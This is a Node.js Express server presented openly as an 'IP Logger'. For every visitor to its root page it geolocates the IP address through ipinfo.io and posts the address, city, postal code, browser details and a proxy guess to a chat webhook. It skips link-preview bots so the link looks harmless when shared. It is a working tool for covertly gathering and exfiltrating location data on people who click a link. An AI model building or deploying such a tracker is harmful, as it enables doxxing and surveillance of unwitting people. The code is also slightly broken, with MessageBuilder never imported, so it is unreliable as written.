const unwantedUserAgents = ["Vercelbot/0.1 (+https://vercel.com/)", "got (https://github.com/sindresorhus/got)"];
const fetch = require("isomorphic-fetch");
const express = require("express");
const app = express();

const { sendWebhook } = require("./webhook");
const channelID = process.env.channel_id;
const ip_token = process.env.ip_token;
const port = process.env.port || 3000;

app.get("/", async (req, res) => {
  const ipAddress = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
  const userAgent = req.headers["user-agent"];
  const isUnwantedUserAgent = unwantedUserAgents.some(unwantedUserAgent => userAgent.includes(unwantedUserAgent));
  if (isUnwantedUserAgent) { res.status(200).send("Skipping unwanted User Agent"); return; }
  const { region, city, country, postal } = await (await fetch(`https://ipinfo.io/${ipAddress}?token=${ip_token}`)).json();
  const lang = req.headers["accept-language"]?.split(",")[0] || "Unknown";
  const platform = userAgent ? userAgent.split("(")[1].split(")")[0] : "Unknown";
  const browser = userAgent ? userAgent.split("/")[0] : "Unknown";
  const isProxy = req.headers["via"] || req.headers["x-forwarded-for"];
  try {
    const embed = new MessageBuilder()
      .setTitle("IP Logger")
      .setDescription("This is an IP logger made by https://github.com/baum1810")
      .addField("IP", ipAddress)
      .addField("Country", country)
      .addField("Region", region)
      .addField("City", city)
      .addField("Postal", postal)
      .addField("User Agent", userAgent)
      .addField("Browser Language", lang)
      .addField("Platform", platform)
      .addField("Browser", browser)
      .addField("Proxy/VPN", isProxy ? "Yes" : "No")
      .setColor("#5CDBF0")
      .setTimestamp();
    await sendWebhook(channelID, embed);

    const htmlContent = `
      <!DOCTYPE html>
      <html lang="en">
      <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Address Logged</title>
        <style>
          body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background: linear-gradient(45deg, #84fab0 0%, #8fd3f4 100%);
            margin: 0;
            font-family: Arial, sans-serif;
          }
          h1 {
            font-size: 5rem;
            animation: fadeIn 4s ease-in-out infinite;
          }
          @keyframes fadeIn {
            0%, 100% { opacity: 0; }
            50% { opacity: 1; }
          }
        </style>
      </head>
      <body>
        <h1>Address Logged</h1>
      </body>
      </html>
    `;

    res.send(htmlContent);
  } catch (error) {
    console.error(`Error handling request: ${error}`);
    res.status(500).send("Internal server error");
  }
});

app.listen(port, () => console.log(`App listening at http://localhost:${port}`));
